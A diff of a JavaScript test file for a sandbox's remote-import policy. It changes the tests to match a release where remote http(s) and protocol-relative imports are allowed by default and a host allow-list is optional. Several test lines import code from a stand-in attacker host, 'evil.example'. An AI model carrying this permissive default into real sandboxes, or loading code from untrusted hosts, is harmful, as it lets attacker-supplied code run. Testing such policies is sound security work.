@@ -1,7 +1,8 @@
 /**
- * #7: sandboxImport() must not load arbitrary remote code. Remote http(s)
- * specifiers are denied unless the host lists the hostname in
- * `allowedImportHosts`; import-map targets are host-authored and trusted.
+ * #7: sandboxImport() remote policy. With `allowedImportHosts` unset, remote
+ * http(s) specifiers are allowed (0.1.1 reverted the 0.1.0 deny-by-default);
+ * when provided, only listed hostnames (plus baseURL's host) pass and an
+ * empty list denies all. Import-map targets are host-authored and trusted.
  * (Node cannot import http(s) URLs at all, so "allowed" is observed as "got
  * past the policy and failed in the loader", never as "denied".)
  */
@@ -21,16 +22,30 @@ afterEach(async () => {
 const imp = (spec) => `return await sandboxImport(${JSON.stringify(spec)})`;
 
 describe('#7 sandboxImport remote policy', () => {
-  it('denies an absolute http(s) import by default', async () => {
+  const notDenied = (e) => !/Import denied/.test(e.message);
+
+  it('allows absolute http(s) imports by default (allowedImportHosts unset)', async () => {
     const sb = await make();
-    await assert.rejects(() => sb.evaluate(imp('https://evil.example/x.js')), /Import denied.*evil\.example/);
+    await assert.rejects(() => sb.evaluate(imp('https://evil.example/x.js')), notDenied);
+    await assert.rejects(() => sb.evaluate(imp('http://evil.example:8080/x.js')), notDenied);
+  });
+
+  it('allows protocol-relative specifiers by default', async () => {
+    const sb = await make();
+    await assert.rejects(() => sb.evaluate(imp('//evil.example/x.js')), notDenied);
+  });
+
+  it('denies protocol-relative and host-escaping specifiers when a list is provided', async () => {
+    const sb = await make({ allowedImportHosts: ['cdn.example'] });
+    await assert.rejects(() => sb.evaluate(imp('//evil.example/x.js')), /Import denied.*evil\.example/);
+    await assert.rejects(() => sb.evaluate(imp('//EVIL.example/x.js')), /Import denied/);
     await assert.rejects(() => sb.evaluate(imp('http://evil.example:8080/x.js')), /Import denied/);
   });
 
-  it('denies protocol-relative and host-escaping specifiers', async () => {
-    const sb = await make();
-    await assert.rejects(() => sb.evaluate(imp('//evil.example/x.js')), /Import denied.*evil\.example/);
-    await assert.rejects(() => sb.evaluate(imp('//EVIL.example/x.js')), /Import denied/);
+  it("baseURL's host stays allowed when a list is provided", async () => {
+    const sb = await make({ baseURL: 'https://app.example/', allowedImportHosts: ['cdn.example'] });
+    await assert.rejects(() => sb.evaluate(imp('https://app.example/x.js')), notDenied);
+    await assert.rejects(() => sb.evaluate(imp('https://evil.example/x.js')), /Import denied/);
   });
 
   it('allows only listed hostnames (case-insensitive), still denies others', async () => {
